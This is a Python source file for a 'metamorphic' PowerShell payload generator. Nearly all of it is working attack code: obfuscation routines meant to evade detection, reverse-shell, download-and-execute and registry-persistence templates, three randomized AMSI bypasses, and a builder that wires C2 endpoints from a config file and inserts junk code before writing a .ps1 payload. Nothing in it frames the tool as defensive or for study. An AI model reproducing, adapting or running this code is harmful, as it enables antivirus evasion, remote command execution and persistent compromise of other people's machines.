import random
import string
import unicodedata
import base64
import os
import re
import math
import datetime
import itertools
import sys
import hashlib
import time
import threading
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path
import json

from config import config
from logging_config import app_logger, performance_logger, PerformanceTracker

class ObfuscationEngine:
    """Advanced obfuscation engine with multiple techniques"""
    
    def __init__(self):
        self.unicode_pools = [
            string.ascii_letters,
            'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ',  # Greek uppercase
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  # Cyrillic lowercase
            '𝒜𝒞𝒟𝒢𝒥𝒦𝒩𝒪𝒫𝒬𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵',  # Math script
            '𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩',  # Math bold script
            '𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ'  # Double-struck
        ]
        self.safe_chars = string.ascii_letters + string.digits + '_'
        self.prefixes = ['_', 'tmp', 'var', 'x', 'z', 'obj', 'str', 'int', 'bool', 'arr', 'ptr', 'ref', 'val', 'dat', 'buf']
        self.suffixes = ['_', 'Obj', 'Val', 'Str', 'Int', 'Arr', 'List', 'Dict', 'Hash', 'Map', 'Ptr', 'Ref', 'Buf', 'Mem', 'Reg']

    def random_unicode_letter(self) -> str:
        """Generate a random unicode letter"""
        pool = random.choice(self.unicode_pools)
        return random.choice(pool)

    def morph_name(self, base: str, min_len: int = 8, max_len: int = 20) -> str:
        """Generate morphed variable names with enhanced obfuscation"""
        # Only use PowerShell-valid variable name characters
        name = ''.join(random.choice([c, random.choice(self.safe_chars)]) for c in base)
        chars = list(name)

        # Enhanced case mixing
        chars = [c.upper() if random.random() < 0.5 else c.lower() for c in chars]

        # Add complex prefixes and suffixes
        if random.random() < 0.6:
            chars.insert(0, random.choice(self.prefixes))
        if random.random() < 0.6:
            chars.append(random.choice(self.suffixes))

        # Ensure length constraints
        final_name = ''.join(chars)
        if len(final_name) < min_len:
            final_name += ''.join(random.choices(self.safe_chars, k=min_len - len(final_name)))
        elif len(final_name) > max_len:
            final_name = final_name[:max_len]

        # Ensure it starts with a letter or underscore
        if final_name and final_name[0].isdigit():
            final_name = '_' + final_name[1:]

        return final_name

    def obfuscate_string(self, s: str) -> str:
        """Enhanced string obfuscation with multiple methods"""
        methods = [
            "base64", "hex", "char_array", "split_join", 
            "format", "concat", "reverse", "xor", "unicode_escape",
            "binary", "rot13"
        ]
        method = random.choice(methods)

        if method == "base64":
            encoded = base64.b64encode(s.encode('utf-8')).decode('ascii')
            return f"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}'))"

        elif method == "hex":
            hex_chars = ''.join(f'{ord(c):02x}' for c in s)
            return f"[System.Text.Encoding]::UTF8.GetString([byte[]]@(0x{',0x'.join(hex_chars[i:i+2] for i in range(0, len(hex_chars), 2))}))"

        elif method == "char_array":
            parts = [f"[char]{ord(c)}" for c in s]
            return f"({' + '.join(parts)})"

        elif method == "split_join":
            delimiter = random.choice(['|', '#', '@', '&', '%'])
            return f"'{delimiter.join(s)}' -split '{delimiter}' -join ''"

        elif method == "format":
            format_str = ''.join(f'{{{i}}}' for i in range(len(s)))
            char_list = ', '.join(f"'{c}'" for c in s)
            return f"'{format_str}' -f {char_list}"

        elif method == "concat":
            parts = [f"'{c}'" for c in s]
            return ' + '.join(parts)

        elif method == "reverse":
            return f"('{s[::-1]}' -split '' | ForEach-Object {{ $_ }} | ForEach-Object -Begin {{ $arr = @() }} -Process {{ $arr = ,$_ + $arr }} -End {{ $arr -join '' }})"

        elif method == "xor":
            key = random.randint(1, 255)
            xored = ''.join(chr(ord(c) ^ key) for c in s)
            xored_bytes = ','.join(str(ord(c)) for c in xored)
            return f"[System.Text.Encoding]::UTF8.GetString([byte[]]@({xored_bytes}) | ForEach-Object {{ $_ -bxor {key} }})"

        elif method == "unicode_escape":
            escaped = ''.join(f'\\u{ord(c):04x}' for c in s)
            return f"[System.Text.RegularExpressions.Regex]::Unescape('{escaped}')"

        elif method == "binary":
            binary = ''.join(f'{ord(c):08b}' for c in s)
            chunks = [binary[i:i+8] for i in range(0, len(binary), 8)]
            return f"[string]::Join('', @({','.join(f'[char][Convert]::ToInt32(\"{chunk}\", 2)' for chunk in chunks)}))"

        elif method == "rot13":
            rot13 = ''.join(
                chr((ord(c) - ord('a') + 13) % 26 + ord('a')) if 'a' <= c <= 'z' else
                chr((ord(c) - ord('A') + 13) % 26 + ord('A')) if 'A' <= c <= 'Z' else c
                for c in s
            )
            return f"('{rot13}'.ToCharArray() | ForEach-Object {{ if ([char]::IsLetter($_)) {{ $base = if ([char]::IsUpper($_)) {{ [int][char]'A' }} else {{ [int][char]'a' }}; [char](([int][char]$_ - $base + 13) % 26 + $base) }} else {{ $_ }} }} -join '')"

        return f"'{s}'"  # Fallback

    def obfuscate_int(self, n: int) -> str:
        """Enhanced integer obfuscation"""
        methods = ["math", "hex", "str_parse", "split_sum", "bitwise", "scientific"]
        method = random.choice(methods)

        if method == "math":
            a = random.randint(1, max(1, n))
            b = n - a
            ops = ['+', '-', '*']
            op = random.choice(ops)
            if op == '+':
                return f"{a}+{b}"
            elif op == '-':
                return f"{a + b}-{a}"
            else:  # multiplication
                if a != 0:
                    return f"{a}*{n // a + (1 if n % a else 0)}"
                return str(n)

        elif method == "hex":
            return f"0x{n:x}"

        elif method == "str_parse":
            return f"[int]::Parse('{n}')"

        elif method == "split_sum":
            if n <= 0:
                return str(n)
            parts = []
            left = n
            num_parts = random.randint(2, min(5, n))
            for _ in range(num_parts - 1):
                part = random.randint(1, left - 1)
                parts.append(str(part))
                left -= part
            parts.append(str(left))
            return '+'.join(parts)

        elif method == "bitwise":
            # Use bitwise operations
            shift = random.randint(1, 4)
            return f"({n << shift}) -shr {shift}"

        elif method == "scientific":
            if n >= 10:
                exp = len(str(n)) - 1
                mantissa = n / (10 ** exp)
                return f"[int]({mantissa}e{exp})"

        return str(n)

class PayloadTemplate:
    """Template system for different payload types"""
    
    @staticmethod
    def get_reverse_shell_template() -> str:
        return '''
# Reverse Shell Payload Template
function {func_name} {{
    param(${host_var}, ${port_var})
    try {{
        ${client_var} = New-Object System.Net.Sockets.TCPClient(${host_var}, ${port_var})
        ${stream_var} = ${client_var}.GetStream()
        [byte[]]${buffer_var} = {buffer_size}
        while((${bytes_var} = ${stream_var}.Read(${buffer_var}, 0, ${buffer_var}.Length)) -ne 0) {{
            ${data_var} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${buffer_var}, 0, ${bytes_var})
            ${result_var} = (Invoke-Expression ${data_var} 2>&1 | Out-String)
            ${return_bytes_var} = ([text.encoding]::ASCII).GetBytes(${result_var})
            ${stream_var}.Write(${return_bytes_var}, 0, ${return_bytes_var}.Length)
            ${stream_var}.Flush()
        }}
        ${client_var}.Close()
    }} catch {{}}
}}
'''

    @staticmethod
    def get_download_execute_template() -> str:
        return '''
# Download and Execute Template  
function {func_name} {{
    param(${url_var}, ${path_var})
    try {{
        ${web_client_var} = New-Object System.Net.WebClient
        ${web_client_var}.DownloadFile(${url_var}, ${path_var})
        Start-Process ${path_var} -WindowStyle Hidden
    }} catch {{}}
}}
'''

    @staticmethod
    def get_persistence_template() -> str:
        return '''
# Persistence Template
function {func_name} {{
    param(${payload_var}, ${key_var})
    try {{
        Set-ItemProperty -Path ${key_var} -Name {value_name} -Value ${payload_var}
    }} catch {{}}
}}
'''

class PayloadGenerator:
    """Enhanced payload generator with modular architecture"""
    
    def __init__(self):
        self.obfuscator = ObfuscationEngine()
        self.templates = PayloadTemplate()
        self.generation_lock = threading.Lock()
        self._complexity_score = 0
        
    def _calculate_complexity_score(self, payload: str) -> int:
        """Calculate complexity score for generated payload"""
        score = 0
        score += len(re.findall(r'\$\w+', payload)) * 2  # Variables
        score += len(re.findall(r'function\s+\w+', payload)) * 5  # Functions
        score += len(re.findall(r'\[.*?\]', payload)) * 3  # Type casts
        score += len(re.findall(r'-\w+', payload))  # Parameters
        score += payload.count('try') * 10  # Error handling
        return score

    def generate_unique_filename(self) -> str:
        """Generate unique filename with timestamp and hash"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        return f"metamorphic_payload_{timestamp}_{random_suffix}.ps1"

    def random_amsi_bypass(self) -> str:
        """Generate randomized AMSI bypass techniques"""
        techniques = []
        
        # Technique 1: Classic Reflection
        var1 = self.obfuscator.morph_name('amsi')
        var2 = self.obfuscator.morph_name('init')
        var3 = self.obfuscator.morph_name('utils')
        var4 = self.obfuscator.morph_name('field')
        
        t1 = f'''
try {{
    ${var1} = [Ref].Assembly.GetType({self.obfuscator.obfuscate_string('System.Management.Automation.AmsiUtils')})
    ${var4} = ${var1}.GetField({self.obfuscator.obfuscate_string('amsiInitFailed')}, 'NonPublic,Static')
    ${var4}.SetValue($null, $true)
}} catch {{}}
'''
        techniques.append(t1)

        # Technique 2: Memory Patch
        var5 = self.obfuscator.morph_name('ptr')
        var6 = self.obfuscator.morph_name('bytes')
        
        t2 = f'''
try {{
    [Ref].Assembly.GetType({self.obfuscator.obfuscate_string('System.Management.Automation.AmsiUtils')})
    | ForEach-Object {{
        ${var5} = $_.GetField({self.obfuscator.obfuscate_string('amsiInitFailed')}, 'NonPublic,Static')
        ${var5}.SetValue($null, $true)
    }}
}} catch {{}}
'''
        techniques.append(t2)

        # Technique 3: Alternative bypass
        var7 = self.obfuscator.morph_name('amsi')
        var8 = self.obfuscator.morph_name('context')
        
        t3 = f'''
try {{
    ${var7} = {self.obfuscator.obfuscate_string('AmsiUtils')}
    ${var8} = [Ref].Assembly.GetType({self.obfuscator.obfuscate_string('System.Management.Automation.')} + ${var7})
    ${var8}.GetField({self.obfuscator.obfuscate_string('amsiInitFailed')}, 'NonPublic,Static').SetValue($null, $true)
}} catch {{}}
'''
        techniques.append(t3)

        return random.choice(techniques)

    def generate_junk_code(self) -> List[str]:
        """Generate sophisticated junk code blocks"""
        junk_blocks = []
        num_blocks = random.randint(5, 15)
        
        for _ in range(num_blocks):
            junk_type = random.choice([
                'variable_assignment',
                'function_definition', 
                'conditional_block',
                'loop_block',
                'comment_block',
                'type_manipulation',
                'array_operations',
                'string_operations',
                'math_operations',
                'datetime_operations'
            ])
            
            if junk_type == 'variable_assignment':
                var_name = self.obfuscator.morph_name('junk')
                value = self.obfuscator.obfuscate_string(''.join(random.choices(string.ascii_letters, k=15)))
                junk_blocks.append(f"${var_name} = {value}")
                
            elif junk_type == 'function_definition':
                func_name = self.obfuscator.morph_name('junkfunc')
                param_name = self.obfuscator.morph_name('param')
                junk_blocks.append(f"function {func_name} {{ param(${param_name}) return ${param_name} }}")
                
            elif junk_type == 'conditional_block':
                condition = f"{self.obfuscator.obfuscate_int(1)}+{self.obfuscator.obfuscate_int(1)} -eq {self.obfuscator.obfuscate_int(2)}"
                var_name = self.obfuscator.morph_name('temp')
                junk_blocks.append(f"if ({condition}) {{ ${var_name} = $true }} else {{ ${var_name} = $false }}")
                
            elif junk_type == 'loop_block':
                var_name = self.obfuscator.morph_name('counter')
                limit = self.obfuscator.obfuscate_int(random.randint(1, 10))
                junk_blocks.append(f"for (${var_name} = 0; ${var_name} -lt {limit}; ${var_name}++) {{ $null = ${var_name} }}")
                
            elif junk_type == 'comment_block':
                comment_text = ''.join(random.choices(string.ascii_letters + ' ', k=50))
                junk_blocks.append(f"# {comment_text}")
                
            elif junk_type == 'type_manipulation':
                var_name = self.obfuscator.morph_name('typevar')
                type_name = random.choice(['System.String', 'System.Int32', 'System.Boolean', 'System.DateTime'])
                junk_blocks.append(f"${var_name} = [{type_name}]::new()")
                
            elif junk_type == 'array_operations':
                arr_name = self.obfuscator.morph_name('arr')
                size = self.obfuscator.obfuscate_int(random.randint(1, 20))
                junk_blocks.append(f"${arr_name} = @(({self.obfuscator.obfuscate_int(1)})..({size})) | Get-Random -Count {self.obfuscator.obfuscate_int(5)}")
                
            elif junk_type == 'string_operations':
                str_name = self.obfuscator.morph_name('str')
                text = ''.join(random.choices(string.ascii_letters, k=12))
                junk_blocks.append(f"${str_name} = {self.obfuscator.obfuscate_string(text)}.ToUpper().ToLower()")
                
            elif junk_type == 'math_operations':
                num_name = self.obfuscator.morph_name('num')
                val1 = self.obfuscator.obfuscate_int(random.randint(1, 100))
                val2 = self.obfuscator.obfuscate_int(random.randint(1, 100))
                op = random.choice(['+', '-', '*', '%'])
                junk_blocks.append(f"${num_name} = ({val1}) {op} ({val2})")
                
            elif junk_type == 'datetime_operations':
                date_name = self.obfuscator.morph_name('date')
                junk_blocks.append(f"${date_name} = Get-Date; ${date_name} = ${date_name}.AddDays({self.obfuscator.obfuscate_int(random.randint(-30, 30))})")
        
        return junk_blocks

    def generate_payload_content(self) -> str:
        """Generate payload content without writing to file"""
        with self.generation_lock:
            try:
                # Generate morphed variable names
                vars_map = {k: self.obfuscator.morph_name(k) for k in [
                    'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 
                    'sendbyte', 'encoding', 'readLength', 'aes', 'encryptor', 
                    'iv', 'key', 'cmd', 'result', 'junk', 'success'
                ]}

                # AMSI bypass section
                amsi_bypass = self.random_amsi_bypass()

                # Generate AES setup with enhanced obfuscation
                aes_key = base64.b64encode(os.urandom(32)).decode()
                aes_iv = base64.b64encode(os.urandom(16)).decode()
                
                aes_block = f"""
try {{
    ${vars_map['aes']} = [System.Security.Cryptography.Aes]::Create()
    ${vars_map['aes']}.Key = [Convert]::FromBase64String({self.obfuscator.obfuscate_string(aes_key)})
    ${vars_map['aes']}.IV = [Convert]::FromBase64String({self.obfuscator.obfuscate_string(aes_iv)})
    ${vars_map['encryptor']} = ${vars_map['aes']}.CreateDecryptor()
}} catch {{
    $null
}}
"""

                # Network operations with C2 endpoints
                c2_endpoints = config.C2_ENDPOINTS
                network_block = f"""
try {{
    ${vars_map['client']} = New-Object System.Net.Sockets.TCPClient
    $endpoint = @(
        {','.join([f'({self.obfuscator.obfuscate_string(ep["host"])}, {self.obfuscator.obfuscate_int(ep["port"])})' for ep in c2_endpoints])}
    ) | Get-Random
    ${vars_map['result']} = ${vars_map['client']}.BeginConnect($endpoint[0], $endpoint[1], $null, $null)
    ${vars_map['success']} = ${vars_map['result']}.AsyncWaitHandle.WaitOne((Get-Random -Minimum {self.obfuscator.obfuscate_int(500)} -Maximum {self.obfuscator.obfuscate_int(2000)}), $false)
    if (${vars_map['success']}) {{
        ${vars_map['client']}.EndConnect(${vars_map['result']})
    }}
    ${vars_map['client']}.Close()
}} catch {{
    $null
}}
"""

                # Build payload blocks
                blocks = [aes_block, network_block]
                
                # Insert junk code randomly
                junk_blocks = self.generate_junk_code()
                for junk in junk_blocks:
                    idx = random.randint(0, len(blocks))
                    blocks.insert(idx, junk)

                # Build final payload
                payload = "$ErrorActionPreference = 'SilentlyContinue'\n\n"
                
                # Add helper functions
                payload += """
# Enhanced helper functions
function Convert-StringToBytes {
    param([string]$InputString)
    [System.Text.Encoding]::UTF8.GetBytes($InputString)
}

function Convert-ToBase64 {
    param([string]$InputString)
    [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($InputString))
}

function Convert-FromBase64 {
    param([string]$InputString)
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($InputString))
}

function Convert-ToHex {
    param([string]$InputString)
    -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('{0:X2}', [int][char]$_) })
}

function Convert-FromHex {
    param([string]$InputString)
    -join ($InputString -split '(..)' | Where-Object { $_ } | ForEach-Object { [char][convert]::ToInt32($_, 16) })
}

function Convert-Rot13 {
    param([string]$InputString)
    $InputString.ToCharArray() | ForEach-Object {
        if ([char]::IsLetter($_)) {
            $base = if ([char]::IsUpper($_)) { [int][char]'A' } else { [int][char]'a' }
            [char](([int][char]$_ - $base + 13) % 26 + $base)
        } else { $_ }
    } -join ''
}

"""

                # Add AMSI bypass first, then all other blocks
                payload += amsi_bypass + '\n' + '\n'.join(blocks)
                
                # Calculate complexity score
                self._complexity_score = self._calculate_complexity_score(payload)
                
                app_logger.debug(f"Generated payload with complexity score: {self._complexity_score}")
                
                return payload

            except Exception as e:
                app_logger.error(f"Error generating payload content: {str(e)}", exc_info=e)
                # Return a basic error payload
                return f"""
# Error generating payload: {str(e)}
Write-Host 'Failed to generate payload'
$ErrorActionPreference = 'SilentlyContinue'
"""

    def generate_payload_file(self, filepath: str) -> str:
        """Generate payload and write to file"""
        try:
            content = self.generate_payload_content()
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            
            app_logger.info(f"Payload written to file: {filepath}")
            return filepath
            
        except Exception as e:
            app_logger.error(f"Error writing payload to file {filepath}: {str(e)}", exc_info=e)
            raise

    @property
    def last_complexity_score(self) -> int:
        """Get the complexity score of the last generated payload"""
        return self._complexity_score

# Backwards compatibility functions
def generate_metamorphic_payload() -> str:
    """Backwards compatibility function"""
    generator = PayloadGenerator()
    filename = generator.generate_unique_filename()
    return generator.generate_payload_file(filename)

def morph_name(base: str, min_len: int = 8, max_len: int = 20) -> str:
    """Backwards compatibility function"""
    engine = ObfuscationEngine()
    return engine.morph_name(base, min_len, max_len)

def obfuscate_string(s: str) -> str:
    """Backwards compatibility function"""
    engine = ObfuscationEngine()
    return engine.obfuscate_string(s)

def obfuscate_int(n: int) -> str:
    """Backwards compatibility function"""
    engine = ObfuscationEngine()
    return engine.obfuscate_int(n)

if __name__ == "__main__":
    try:
        generator = PayloadGenerator()
        filename = generator.generate_unique_filename()
        result_file = generator.generate_payload_file(filename)
        print(f"Metamorphic payload written to {result_file}")
        print(f"Complexity score: {generator.last_complexity_score}")
    except Exception as e:
        print(f"ERROR: Exception during payload generation: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)
